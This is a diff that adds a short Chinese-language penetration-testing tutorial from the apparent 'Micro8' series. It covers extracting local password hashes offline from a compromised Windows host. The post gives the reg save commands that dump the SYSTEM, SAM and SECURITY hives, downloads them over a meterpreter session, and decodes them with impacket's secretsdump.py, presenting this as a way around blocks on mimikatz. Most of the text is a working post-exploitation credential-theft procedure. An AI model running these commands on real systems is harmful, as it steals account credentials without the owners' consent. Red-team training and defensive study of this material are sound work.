@@ -1,0 +1,41 @@
+---
+title: 56、离线提取目标机hash
+date: 2019-09-21 19:05:40
+comments: true
+categories: 
+ - Micro8系列
+---
+
+
+很多环境下，不允许上传或者使用 mimikatz。而针对非域控的单机离线提取 hash 显得尤为重要。
+
+在 meterpreter shell 命令切到交互式 cmd 命令。  
+![](../do/media/647ac3d1d83b7d7711b2cfd0ce18f1d5.jpg)
+
+reg save 方式使得需要下载的目标机hash文件更小。  
+* reg save HKLM\SYSTEM sys.hiv  
+* reg save HKLM\SAM sam.hiv  
+* reg save hklm\security security.hiv  
+
+![](../do/media/cebaa1fc93231bc1aaf7738c222b5ac6.jpg)
+
+![](../do/media/f2dc08a2bd64fc29ec0189933b4442dc.jpg)
+
+meterpreter下自带download功能。  
+
+![](../do/media/336cd95e4be157c266efcd04d9ddc064.jpg)
+
+![](../do/media/3f2d037ed7ac0197c01e95b7651fad41.jpg)
+
+### 离线提取：
+
+本季用到的是 impacket 的  secretsdump.py。Kali默认路径：`/root/impacket/examples/secretsdump.py`
+
+**命令如下：**
+```code
+root@John:/tmp# python /root/impacket/examples/secretsdump.py ‐sam sam.hiv ‐security security.hiv ‐system sys.hiv LOCAL
+```
+![](../do/media/ced7254cc160ced11f2f3f512df53aec.jpg)
+
+
+>   Micropoor
